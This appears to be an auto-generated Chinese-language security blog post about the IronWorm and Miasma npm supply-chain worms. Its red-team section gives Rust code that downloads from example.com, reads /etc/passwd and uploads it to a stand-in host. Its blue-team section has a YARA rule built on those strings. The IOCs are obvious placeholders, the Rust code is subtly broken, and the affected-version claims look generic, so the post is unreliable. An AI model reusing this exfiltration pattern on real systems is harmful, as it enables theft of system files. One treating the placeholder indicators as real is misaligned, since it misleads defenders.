---
layout: post
title:  "IronWorm and New Miasma Worm Variant Hit npm in Supply Chain Attacks"
date:   2026-06-05 19:44:45 +0000
categories: [security]
severity: critical
---

# 🚨 解析 npm 生態系統中的 IronWorm 和 Miasma 蠕蟲攻擊
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution) 和 Info Leak
> * **關鍵技術**: eBPF, Rust, GitHub Actions, npm

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: IronWorm 和 Miasma 蠕蟲攻擊利用了 npm 生態系統中的漏洞，特別是 `preinstall` 和 `postinstall` 腳本的執行機制。攻擊者可以通過創建惡意的 npm 包並將其發佈到 npm 注冊表中，從而實現遠程代碼執行和信息竊取。
* **攻擊流程圖解**:
  1. 攻擊者創建惡意的 npm 包並將其發佈到 npm 注冊表中。
  2. 受害者安裝惡意的 npm 包。
  3. `preinstall` 或 `postinstall` 腳本被執行，實現遠程代碼執行和信息竊取。
* **受影響元件**: npm 6.x 和 7.x 版本，GitHub Actions，Rust 1.50 和以上版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有一個 npm 帳戶和 GitHub 帳戶。
* **Payload 建構邏輯**:

    ```
    
    rust
    // 惡意的 npm 包代碼
    use std::process::Command;
    
    fn main() {
        // 執行遠程代碼
        let output = Command::new("curl")
            .arg("https://example.com/malicious_code")
            .arg("-o")
            .arg("/tmp/malicious_code")
            .output()
            .expect("failed to execute process");
    
        // 執行信息竊取
        let output = Command::new("cat")
            .arg("/etc/passwd")
            .output()
            .expect("failed to execute process");
    
        // 上傳竊取的信息
        let output = Command::new("curl")
            .arg("https://example.com/upload_info")
            .arg("-d")
            .arg("info=")
            .arg(output.stdout)
            .output()
            .expect("failed to execute process");
    }
    
    ```
* **繞過技術**: 攻擊者可以使用 eBPF 來隱藏惡意的系統調用和信息竊取。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /tmp/malicious_code |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule malicious_npm_package {
        meta:
            description = "Detects malicious npm package"
            author = "Your Name"
        strings:
            $a = "curl https://example.com/malicious_code"
            $b = "cat /etc/passwd"
        condition:
            $a and $b
    }
    
    ```
* **緩解措施**: 更新 npm 到最新版本，禁用 `preinstall` 和 `postinstall` 腳本，使用 GitHub Actions 的安全功能。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **eBPF (Extended Berkeley Packet Filter)**: 一種 Linux 內核技術，允許用戶空間程序注入和執行內核代碼。
* **Rust**: 一種系統編程語言，注重安全性和性能。
* **GitHub Actions**: 一種持續集成和持續部署 (CI/CD) 平台，允許用戶自動化軟件開發和部署過程。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/06/ironworm-and-new-miasma-worm-variant.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


